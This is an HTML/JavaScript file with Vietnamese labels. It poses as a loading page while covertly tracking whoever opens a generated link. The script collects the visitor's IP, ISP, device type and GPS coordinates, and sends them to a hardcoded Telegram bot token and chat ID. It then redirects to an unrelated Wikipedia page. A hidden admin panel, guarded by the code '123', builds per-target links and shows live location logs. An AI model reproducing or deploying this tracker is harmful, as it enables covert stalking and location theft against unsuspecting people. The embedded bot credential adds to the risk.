<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="dyn-title">ƒêang T·∫£i...</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: system-ui; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .admin-bg { background: #010409; color: #c9d1d9; }
        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .input-dark { background: #010409; border: 1px solid #30363d; color: #f0f6fc; padding: 10px; border-radius: 8px; width: 100%; font-size: 11px; outline: none; }
        .input-dark:focus { border-color: #3b82f6; }
    </style>
</head>
<body id="main-body" class="victim-body">

    <div id="ui-victim" class="text-center">
        <div class="loader" style="margin: 0 auto;"></div>
        <div class="mt-4 text-[#777] text-[12px] italic">ƒêang t·∫£i...</div>
    </div>

    <div id="ui-admin" class="hidden w-full p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-gray-800 pb-4">
                <h1 class="text-xl font-black text-white uppercase tracking-tighter">BCA</span></h1>
                <button onclick="logout()" class="text-[10px] bg-red-950/20 text-red-500 border border-red-900/50 px-4 py-2 rounded-xl font-bold uppercase">Logout</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-4 space-y-6">
                    <div class="glass p-5 space-y-4 shadow-2xl">
                        <h3 class="text-[10px] font-black text-green-500 uppercase tracking-widest italic border-b border-gray-800 pb-2">Robot & Link Builder</h3>
                        <input id="cfg-tk" type="password" placeholder="Bot Token" class="input-dark">
                        <input id="cfg-id" type="text" placeholder="Chat ID" class="input-dark">
                        <input id="cfg-rd" type="text" placeholder="Link ƒë√≠ch cu·ªëi" class="input-dark">
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u..." class="input-dark">
                        <button onclick="saveAndBuild()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-[10px] uppercase transition-all">T·∫°o Link Thu Ho·∫°ch</button>
                        <div id="box-result" class="hidden p-3 bg-black rounded border border-blue-900/30 mt-2">
                            <div id="out-link" onclick="copyText(this)" class="text-[10px] text-blue-400 break-all cursor-pointer font-mono text-center"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass min-h-[550px] flex flex-col overflow-hidden shadow-2xl">
                        <div class="p-4 border-b border-gray-800 flex justify-between bg-black/20 text-white">
                            <h3 class="text-[10px] font-black uppercase italic tracking-widest">Live Operations Logs (Device + IP)</h3>
                            <button onclick="clearLogs()" class="text-[9px] text-gray-500 hover:text-red-500 font-bold uppercase">X√≥a</button>
                        </div>
                        <div class="overflow-x-auto flex-1 font-sans">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black/50 text-gray-500 uppercase text-[9px] font-bold">
                                    <tr>
                                        <th class="p-4">Target / Thi·∫øt b·ªã</th>
                                        <th class="p-4">M·∫°ng (IP/ISP)</th>
                                        <th class="p-4">V·ªã tr√≠ / T·ªça ƒë·ªô</th>
                                        <th class="p-4 text-right">Map</th>
                                    </tr>
                                </thead>
                                <tbody id="log-list" class="divide-y divide-gray-800 text-gray-300">
                                    </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let config = {
            t: "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4",
            i: "857408205",
            r: "https://vi.wikipedia.org/wiki/ƒê√†o_Minh_Qu√¢n"
        };

        const urlParams = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (urlParams.has('admin')) {
                if (localStorage.getItem('v37_auth') === 'true' || prompt("Access Code:") === "123") {
                    localStorage.setItem('v37_auth', 'true');
                    initAdmin();
                } else { window.location.search = ""; }
            } else { startPhantom(); }
        };

        // H√†m l·∫•y th√¥ng tin thi·∫øt b·ªã
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown Device";
            if (/android/i.test(ua)) device = "Android Phone";
            if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS Device";
            if (/Windows/i.test(ua)) device = "Windows PC";
            if (/Macintosh/i.test(ua)) device = "MacBook";
            
            const browser = ua.includes("Chrome") ? "Chrome" : ua.includes("Safari") ? "Safari" : ua.includes("Firefox") ? "Firefox" : "Browser";
            return `${device} (${browser})`;
        }

        async function startPhantom() {
            const target = urlParams.get('name') || 'GUEST';
            const device = getDeviceInfo();
            
            let finalLog = { 
                name: target, 
                device: device,
                time: new Date().toLocaleTimeString(), 
                st: 'IP' 
            };

            // B∆Ø·ªöC 1: L·∫§Y IP QUA HTTPS API (IPWHO.IS)
            try {
                const res = await fetch('https://ipwho.is/').then(r => r.json());
                if(res.success) {
                    finalLog.ip = res.ip;
                    finalLog.isp = res.connection.isp;
                    finalLog.address = `${res.city}, ${res.country}`;
                    finalLog.lat = res.latitude;
                    finalLog.lon = res.longitude;
                    
                    saveLog(finalLog);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + target + "</b>\nüì± TB: " + device + "\nüåê IP: " + res.ip + "\nüè¢ ISP: " + res.connection.isp + "\nüìç G·∫ßn: " + res.city)}`);
                }
            } catch(e) { console.error("IP Error"); }

            const jump = () => window.location.replace(config.r);

            // B∆Ø·ªöC 2: √âP GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    let fullAddr = `T·ªça ƒë·ªô: ${lat}, ${lon}`;
                    try {
                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
                        fullAddr = geo.display_name || fullAddr;
                    } catch(e) {}
                    
                    finalLog.lat = lat; finalLog.lon = lon; finalLog.address = fullAddr; finalLog.st = 'GPS';
                    saveLog(finalLog);
                    await fetch(`https://api.telegram.org/bot${config.t}/sendMessage?chat_id=${config.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + target + "</b> GPS OK\nüìç " + fullAddr + "\nüó∫Ô∏è Map: https://www.google.com/maps?q=" + lat + "," + lon)}`);
                    jump();
                }, jump, { timeout: 5000 });
            } else { jump(); }
            setTimeout(jump, 8000);
        }

        // --- ADMIN ---
        function initAdmin() {
            document.getElementById('main-body').className = "admin-bg";
            document.getElementById('ui-victim').classList.add('hidden');
            document.getElementById('ui-admin').classList.remove('hidden');
            const saved = localStorage.getItem('v37_cfg');
            if(saved) config = JSON.parse(saved);
            
            document.getElementById('cfg-tk').value = config.t;
            document.getElementById('cfg-id').value = config.i;
            document.getElementById('cfg-rd').value = config.r;
            
            renderLogs();
            setInterval(renderLogs, 3000);
        }

        function saveAndBuild() {
            config.t = document.getElementById('cfg-tk').value;
            config.i = document.getElementById('cfg-id').value;
            config.r = document.getElementById('cfg-rd').value;
            localStorage.setItem('v37_cfg', JSON.stringify(config));
            const base = window.location.href.split('?')[0];
            const link = base + "?name=" + encodeURIComponent(document.getElementById('in-name').value || 'Target');
            document.getElementById('box-result').classList.remove('hidden');
            document.getElementById('out-link').innerText = link;
        }

        function saveLog(data) {
            let logs = JSON.parse(localStorage.getItem('v37_logs') || '[]');
            if (logs.length > 0 && logs[0].name === data.name && data.st === 'GPS') {
                logs[0] = data;
            } else { logs.unshift(data); }
            localStorage.setItem('v37_logs', JSON.stringify(logs.slice(0, 50)));
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('v37_logs') || '[]');
            const table = document.getElementById('log-list');
            if (logs.length === 0) { table.innerHTML = '<tr><td colspan="4" class="p-10 text-center text-gray-700 italic">Ch∆∞a c√≥ d·ªØ li·ªáu...</td></tr>'; return; }
            table.innerHTML = logs.map(l => `
                <tr class="hover:bg-white/5 border-b border-gray-800 transition">
                    <td class="p-4"><b class="text-white uppercase">${l.name}</b><br><span class="text-[9px] text-blue-500 font-bold">${l.device}</span><br><span class="text-[8px] text-gray-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip || '---'}<br><span class="text-[8px] text-gray-500 uppercase">${l.isp || ''}</span></td>
                    <td class="p-4 text-gray-300 text-[9px] leading-tight max-w-[200px]">${l.address || 'ƒêang x√°c ƒë·ªãnh...'}</td>
                    <td class="p-4 text-right">
                        <a href="https://www.google.com/maps?q=${l.lat},${l.lon}" target="_blank" class="bg-blue-600/20 text-blue-500 px-2 py-1 rounded text-[9px] font-black uppercase">MAP</a>
                    </td>
                </tr>
            `).join('');
        }

        function clearLogs() { if(confirm("X√≥a?")) { localStorage.removeItem('v37_logs'); renderLogs(); } }
        function logout() { localStorage.removeItem('v37_auth'); location.reload(); }
        function copyText(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
    </script>
</body>
</html>
